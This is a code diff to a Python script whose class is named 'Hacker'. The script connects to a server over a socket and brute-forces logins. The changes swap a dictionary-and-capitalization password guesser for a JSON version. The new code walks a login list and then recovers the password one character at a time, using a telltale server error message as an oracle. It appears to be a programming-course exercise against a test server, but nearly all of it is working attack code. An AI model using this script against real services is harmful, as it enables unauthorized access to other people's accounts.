@@ -1,7 +1,8 @@
 import socket
 import argparse
-import itertools
+import json
 import string
+import itertools
 
 
 class Hacker:
@@ -20,6 +21,7 @@ class Hacker:
     def receive_response(self):
         response = self.socket.recv(1024)
         response = response.decode()
+        response = json.loads(response)
         return response
 
     def close_connection(self):
@@ -28,23 +30,21 @@ class Hacker:
     def __del__(self):
         self.socket.close()
 
-
-def password_list_generator():
+def list_from_file_generator(filename):
     passwords = []
-    with open("passwords.txt", 'r') as file:
+    with open(filename, 'r') as file:
         for line in file:
             passwords.append(line.rstrip())
     return passwords
 
-
-def capitalizations(s):
-    if s == '':
-        yield ''
-        return
-    for rest in capitalizations(s[1:]):
-        yield s[0].upper() + rest
-        if s[0].upper() != s[0].lower():
-            yield s[0].lower() + rest
+# def capitalizations(s):
+#     if s == '':
+#         yield ''
+#         return
+#     for rest in capitalizations(s[1:]):
+#         yield s[0].upper() + rest
+#         if s[0].upper() != s[0].lower():
+#             yield s[0].lower() + rest
 
 
 if __name__ == "__main__":
@@ -66,13 +66,33 @@ if __name__ == "__main__":
     hacky = Hacker()
     hacky.connect(args.ip_address, int(args.socket))
 
-    for password in password_list_generator():
-        for combination in capitalizations(password):
-            try:
-                hacky.send_message(combination)
-                response = hacky.receive_response()
-                if response == "Connection successful!":
-                    print(combination)
-                    break
-            except ConnectionAbortedError:
+    login_credentials = {
+        'login': 'admin',
+        "password": ' '
+    }
+    success = False
+    numbers = '01234567890'
+    for login in list_from_file_generator("logins.txt"):
+        login_credentials['login'] = login
+        try:
+            json_login = json.dumps(login_credentials)
+            hacky.send_message(json_login)
+            response = hacky.receive_response()
+            if response == {"result": "Wrong password!"}:
+                password = ""
+                while not success:
+                    for char in string.printable:
+                        login_credentials['password'] = password + char
+                        json_login = json.dumps(login_credentials)
+                        hacky.send_message(json_login)
+                        response = hacky.receive_response()
+                        if response == {"result": "Connection success!"}:
+                            success = True
+                            break
+                        elif response == {"result": "Exception happened during login"}:
+                            password += char
+            if success:
                 break
+        except ConnectionAbortedError:
+            break
+    print(json.dumps(login_credentials))
